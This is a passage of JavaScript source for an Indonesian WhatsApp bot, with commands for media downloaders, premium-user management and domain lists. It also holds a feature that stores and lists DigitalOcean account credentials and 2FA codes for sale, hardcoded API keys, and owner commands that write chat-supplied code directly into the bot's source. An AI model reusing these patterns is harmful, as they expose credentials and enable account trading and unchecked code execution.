case "deldomain": case "deldom": {
if (!isOwner) return reply(mess.owner)
if (Object.keys(domains).length < 1) return reply("Tidak ada domain di dalam database subdomain")
let dom = text.toLowerCase()
if (dom == "all") {
domains = {}
await fs.writeFileSync("./source/data/domain.json", JSON.stringify(domains, null, 2))
return reply(`Berhasil menghapus semua domain ✅`)
}
if (!domains[dom]) return reply(`Domain ${dom} tidak terdaftar di dalam database subdomain`)
delete domains[dom]
await fs.writeFileSync("./source/data/domain.json", JSON.stringify(domains, null, 2))
reply(`Berhasil menghapus domain ${dom} ✅`)
}
break

case "listdomain": case "listdom": {
if (!isOwner) return reply(mess.owner)
if (Object.keys(domains).length < 1) return reply("Tidak ada domain di database subdomain")
let teks = "\n"
for (let i of Object.keys(domains)) {
teks += `* ${i}\n`
}
teks += `\n Contoh Penggunaan :\n *.domain* 2 host|ipvps\n`
return reply(teks)
}
break

case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("dannys8x@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return reply(example("dannys8x@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return reply(example("dannys8x@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./storage/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await reply("Berhasil menambah data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return reply(mess.owner)
if (stokdo.length < 1) return reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./storage/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./storage/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return reply(mess.owner)
if (stokdo.length < 1) return reply("Tidak ada stok")
//if (m.isGroup) return reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return reply(messageText)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upswtag": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await client.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Tag Grub\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli}) 
}
break

case "ip": case "getip": {
if (!isOwner) return reply(mess.owner)
let t = await fetchJson('https://api64.ipify.org?format=json')
reply(`ip Panel : ${t.ip}`)
}
break

case "play": {
if (!text) return example("somebody pleasure")
reply(mess.wait)
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]
var anu = await ytmp3(res.url)
if (anu.audio) {
let urlMp3 = anu.audio
client.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
await client.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdreply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: loli})
} else {
return reply("Error! Result Not Found")
}
}
break

case "addprem": case "addpremium": {
if (!isCreator) return reply(mess.owner)
if (!text && !m.quoted) return reply('*Contoh Penggunaan : .addprem 628xx*')
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./storage/database/premium.json", JSON.stringify(premium, null, 2))
reply(`The Number ${input2} Has Been Premium!`)
}
break

case "listprem": case "listpremium": {
if (premium.length < 1) return reply("Tidak ada user reseller")
let teks = `\n *[ ! ] List All User Premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
client.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: loli})
}
break

case "delpremium": case "delprem": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted && !text) return reply('*Example : .delprem 628xx*')
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./storage/database/premium.json", JSON.stringify(premium, null, 2))
reply(`The Number ${input2} Has Been Removed From Premium!`)
}
break

case 'addcase': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, '../system/DannyS8X.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return reply(result.message);
}});
}
break

case 'delcase': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
reply('Sukses menghapus case!');
} catch (err) {
reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./system/DannyS8X.js', q);
break;
}

case 'editcase':
    if (!q) return reply('Mana case yang ingin diedit? Format: .editcase case \'namafitur\':\n\n<kode baru>');
    if (!isCreator) return reply(mess.owner)

    const caseNameRegex = /case\s+'([^']+)':/; 
    const match = q.match(caseNameRegex);

    if (!match) {
        return reply('Format tidak benar. Contoh: .editcase case \'namafitur\':\n\n<kode baru>');
    }
    const caseName = match[1]; 
    const newCode = q.replace(caseNameRegex, '').trim(); 
    const filenyabang = path.join(__dirname, './system/DannyS8X.js');
    try {
        let data = fs.readFileSync(filenyabang, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${caseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);
        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);
            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);

            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }
            if (endIndex !== -1) {
                const updatedCode = `case '${caseName}':\n${newCode}\n`;
                data = data.slice(0, startIndex) + updatedCode + data.slice(endIndex);
                fs.writeFileSync(filenyabang, data, 'utf8');
                reply(`Succesfully update case ${q}!`);
            } else {
                reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            reply('Sorry, case nya gada di file DannyS8X.js');
        }
    } catch (err) {
        console.error(err);
        reply('Eror, silahkan cek console untuk lihat apa yang eror');
    }
    break;

case 'renamecase':
    if (!q) return reply('Format tidak valid. Contoh: renamecase menu|menu2');
    if (!isCreator) return reply(mess.owner)
    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());
    if (!oldCaseName || !newCaseName) {
        return reply('Format tidak valid. Contoh: renamecase Old|New');
    }
    const rinembos = path.join(__dirname, '../system/DannyS8X.js');
    try {
        let data = fs.readFileSync(rinembos, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${oldCaseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex === -1) {
            return reply(`Case '${oldCaseName}' tidak ditemukan.`);
        }
        const nextCasePattern = /case\s+'/g;
        nextCasePattern.lastIndex = startIndex + 1;
        const nextCaseMatch = nextCasePattern.exec(data);
        const updatedData = data.replace(caseRegex, `case '${newCaseName}':`);
        fs.writeFileSync(rinembos, updatedData, 'utf8');
        reply(`Case '${oldCaseName}' sukses menjadi '${newCaseName}'!`);
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat membaca atau menulis file.');
    }
    break;
    
    

case 'info-cuaca':{
if (!isCreator) return reply(mess.owner)
if (!text) return reply ('What location?')
let wdata = await axios.get(
`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
);
let textw = ""
textw += `*🗺️Weather of  ${text}*\n\n`
textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
textw += `*Description:-* ${wdata.data.weather[0].description}\n`
textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
textw += `*Country:-* ${wdata.data.sys.country}\n`

  client.sendMessage(
m.chat, {
text: textw,
}, {
quoted: loli,
}
   )
   }
   break

case 'listcase': {
if (!isCreator) return reply(mess.owner)
let { listCase } = require('../storage/listcase.js')
reply(listCase())
}
break

case 'addfunc':
case 'addfunction': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Contoh: ${prefix+command} function barunya`);
const namaFile = path.join(__dirname, './system/DannyS8X.js');
const functionBaru = `${text}\n\n`;
const tambahFunction = (data, functionBaru) => {
const posisiButtonUrl = data.indexOf("function buttonurl");
if (posisiButtonUrl !== -1) {
const kodeBaruLengkap = data.slice(0, posisiButtonUrl) + functionBaru + data.slice(posisiButtonUrl);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan function buttonurl di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahFunction(data, functionBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan function baru:');
console.log(functionBaru);
return reply('Sukses menambahkan function!');
}});
} else {
console.error(result.message);
return reply(result.message);
}});
}
break;

case 'delfunc':
case 'delfunction': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Contoh: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./system/DannyS8X.js", "utf8");
const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return reply(`Fungsi ${functionName} tidak ditemukan`);
const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
let functionEnd;

for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
functionEnd = i + 1;
break;
}
prevChar = currentChar;
}
if (functionEnd === undefined) return reply(`Fungsi ${functionName} tidak lengkap atau kurung kurawal tidak seimbang`);
const updatedContent = fileContent.slice(0, functionStart) + fileContent.slice(functionEnd);
fs.writeFileSync("./system/DannyS8X.js", updatedContent, "utf8");
return reply(`Fungsi ${functionName} telah dihapus`);
} catch (err) {
return reply(`Terjadi kesalahan: ${err.message}`);
}};
reply(deleteFunction(q));
}
break


//================================================================================

case "playvid": {
if (!text) return reply(example("dj tiktok"))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await client.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: loli})
} else {
return reply("Error! Result Not Found")
}
await client.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "yts": {
if (!text) return reply(example('we dont talk'))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await reply(teks)
await client.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case 'ytmp3': {
 if (!text) return reply(`Silakan masukkan link youtube nya, Contoh : ${prefix + command} https://youtube.com/watch?v=Xs0Lxif1u9E`);
 const url = text.trim();
 const format = 'mp3';
 const regex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
 if (!regex.test(url)) {
 return reply('link yang anda berikan tidak valid, silahkan masuk kan link yang benar.');
 }
 reply(mess.wait);
 try {
 const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.json();
const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.json();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.json();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await client.sendMessage(m.chat, {
            audio: { url: result.url },
            mimetype: 'audio/mp4'
        }, { quoted: loli });
} catch {
  reply('aduh kak error nieh..')
}
}
break

//================================================================================

case 'ytmp4': {
 if (!text) return reply(`Silakan masukkan link youtube nya, Contoh:  ${prefix + command} https://youtube.com/watch?v=Xs0Lxif1u9E`);
 reply(mess.wait);
try {
 const url = text.trim();
const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.json();
const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.json();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.json();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await client.sendMessage(m.chat, { video: { url: result.url } }, { quoted: loli });
} catch {
  reply('aduh kak error nieh..')
}
}
break

//================================================================================

case "facebook": case "fb": {
if (!text) return example("linknya")
reply(mess.wait)
var anu = await fetchJson(`https://restapi.simplebot.my.id/download/facebook?apikey=${global.apipayment}&url=${text}`)
if (anu.status) {
await client.sendMessage(m.chat, {video: {url: anu.result.media}, caption: "Sucessfully Download Facebook"}, {quoted: loli})
} else {
return reply("Error! Result Not Found")
}
}
break

case "mediafire": {   
    if (!text) return reply(example("linknya"));
    if (!text.includes('mediafire.com')) return reply("Link tautan tidak valid");

    // Endpoint Web API
    const apiUrl = `https://api.neoxr.eu/api/mediafire?url=${encodeURIComponent(text)}&apikey=zakkigans12`;

    try {
        const response = await fetch(apiUrl);
        const apiData = await response.json();

        // Validasi respons API
        if (!response.ok || !apiData.status || !apiData.data || !apiData.data.url) {
            return reply("Error! Result Not Found");
        }

        // Ambil data dari hasil API
        const { title, size, mime, url } = apiData.data;

        // Pastikan URL file tersedia
        if (!url) {
            return reply("Error! Link file tidak ditemukan dalam respons API.");
        }

        // Kirim file sebagai dokumen
        await client.sendMessage(m.chat, {
            document: { url },
            fileName: title || "MediaFire File",
            mimetype: mime || "application/octet-stream",
            caption: `📂 *Nama File:* ${title}\n📦 *Ukuran:* ${size}`
        }, { quoted: loli });

    } catch (error) {
        console.error(error); // Logging error untuk debugging
        reply("Error! Terjadi kesalahan saat mengunduh file.");
    }
}
break;

case "mediafire2":
 if (!text) return reply("Masukkan link MediaFire yang ingin diunduh!");
 try {
 const response = await fetch('https://r.jina.ai/' + text, { 
 headers: { 'x-return-format': 'html' } 
 });
 if (!response.ok) throw new Error("Gagal mengambil data dari MediaFire!");
 const cheerio = require('cheerio');
 const textHtml = await response.text();
 const $ = cheerio.load(textHtml);
 const TimeMatch = $('div.DLExtraInfo-uploadLocation div.DLExtraInfo-sectionDetails')
 .text()
 .match(/This file was uploaded from (.*?) on (.*?) at (.*?)\n/);
 const fileSize = $('a#downloadButton').text().trim().split('\n')[0].trim();
 const result = {
 title: $('div.dl-btn-label').text().trim() || "Tidak diketahui",
 filename: $('div.dl-btn-label').attr('title') || "file",
 url: $('a#downloadButton').attr('href'),
 size: fileSize || "Tidak diketahui",
 from: TimeMatch?.[1] || "Tidak diketahui",
 date: TimeMatch?.[2] || "Tidak diketahui",
 time: TimeMatch?.[3] || "Tidak diketahui"
 };
 if (!result.url) throw new Error("Gagal mendapatkan link unduhan!");
 const caption = `✅ *Berhasil mengunduh file dari MediaFire!*\n\n`
 + `📂 *Nama File:* ${result.filename}\n`
 + `📦 *Ukuran:* ${result.size}\n`
 + `📅 *Tanggal Unggah:* ${result.date}\n`
 + `⏰ *Waktu Unggah:* ${result.time}\n`
 + `🌍 *Diupload dari:* ${result.from}\n\n`
 + `🔗 *Link:* ${result.url}`;
 reply(mess.wait)
 await client.sendMessage(m.chat, { 
 document: { url: result.url },
 mimetype: 'application/octet-stream',
 fileName: result.filename,
 caption: caption
 }, { quoted: loli });
 } catch (error) {
 reply(`❌ *Gagal mengunduh file:* ${error.message}`);
 }
 break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
await client.sendMessage(m.chat, {react: {text: '〽️', key: m.key}})
await reply(mess.wait)
await tiktokDl(text).then(async (res) => {
if (!res.status) return reply("Error! Result Not Found")
await client.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: loli})
await client.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => reply("Error! Result Not Found"))
}
break

//================================================================================

case "apkmod": {
if (!text) return reply(example("capcut"))
await fetchJson(`https://restapi-v2.simplebot.my.id/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
reply(teks)
client.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => reply("Error"))
}
break

case "capcut": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return reply("Error! Result Not Found")
await client.sendMessage(m.chat, {video: {url: res.result.videoUrl}, mimetype: "video/mp4", caption: "*Sucessfully Download Capcut*"}, {quoted: loli})
}).catch((e) => reply("Error"))
}
break

case "doodstream": case "dood": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
try {
let res = await Buddy(`${text}`)
await client.sendMessage(m.chat, {video: {url: res.response.gif.url}, mimetype: "video/mp4", caption: "*Doodstream Downloader ✅*"}, {quoted: loli})
} catch (err) {
console.log(err)
reply("Error result not found")
}
}
break

case "googledrive": case "gdrive": {
if (!text) return reply(example("linknya"))
if (!text.startsWith("https://")) return reply(example("linknya"))
try {
    const res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/gdrive?url=${text}`)
   await client.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
await reply(`Error! result tidak ditemukan`)
}}
break

case "xnxxdl": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/xnxx?url=${text}`).then(async (res) => {
if (!res.status) return reply("Error! Result Not Found")
await client.sendMessage(m.chat, {video: {url: res.result.files.hight || res.result.files.low}, mimetype: "video/mp4", caption: "*Sucessfully Download XnXx*"}, {quoted: loli})
}).catch((e) => reply("Error"))
}
break

//================================================================================
case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./storage/database/savesc/"+nama, ff)
return reply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "daftarsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./storage/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
reply(teks)
}
break

case "readqr": {
if (!/image|video/.test(mime)) return reply(example("dengan reply qris"))
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            reject(error);
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await client.sendMessage(m.chat, {text: `*Data :*\n${dd}`}, {quoted: loli})
}
break

case "hapussc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./storage/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Tidak ada script tersimpan")
if (!text) return reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return reply('Nama script tidak ditemukan')
await fs.unlinkSync("./storage/database/savesc/"+namasc)
reply(`Berhasil menghapus script *${namasc}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./storage/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Tidak ada script tersimpan")
if (!text) return reply(example("namasc|628××"))
if (!text.split("|'")) return reply(example("namasc|628××"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await client.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return reply('Nama script tidak ditemukan')
await client.sendMessage(input, {document: fs.readFileSync("./storage/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: loli})
reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break

case 'instagram': case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return reply(`Anda perlu memberikan URL video, postingan, reel, gambar Instagram apa pun`)
	  reply(mess.wait)
	  client.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
 try {
    const data = await fetchJson(`https://api.ryzendesu.vip/api/downloader/igdl?url=${encodeURIComponent(text)}`);
if (data && data.data && data.data.length > 0 && data.data[0].url) {
    const hasil = data.data[0].url;
    const cap = `ini dia kak🔥`;
    client.sendMessage(m.chat, { video: { url: hasil }, caption: cap }, { quoted: loli });
}
} catch (error) {
    console.error(error);
    const cap = `Maaf, videonya nggak bisa diambil. Ini gambar yang tersedia:`;
    client.sendMessage(m.chat, { image: {url: hasil}, caption: cap}, {quoted: loli});
}
}
break



case "terabox": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/terabox?url=${text}`).then(async (res) => {
if (!res.status) return reply("Error! Result Not Found")
await client.sendMessage(m.chat, {document: {url: res.result}, mimetype: "application/zip", fileName: "Terabox.zip", caption: "*Terabox Downloader ✅*"}, {quoted: loli})

}).catch((e) => reply("Error link tautan tidak didukung"))
}
break

case "spotify": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
await fetchJson(`https://restapi.simplebot.my.id/api/download/spotify?url=${text}`).then(async (res) => {
if (!res.status) return reply("Error! Result Not Found")
await client.sendMessage(m.chat, {audio: {url: res.result}, mimetype: "audio/mpeg"}, {quoted: loli})
}).catch((e) => reply("Error"))
}
break

case "playspotify": case "plays": case "playsp": {
if (!text) return reply(example("last child"))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})

var anu = await fetchJson(`https://restapi-v2.simplebot.my.id/download/playspotify?q=${text}`)

if (anu.result.metadata.link) {
let urlMp3 = anu.result.metadata.link
await client.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdreply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: loli})
} else {
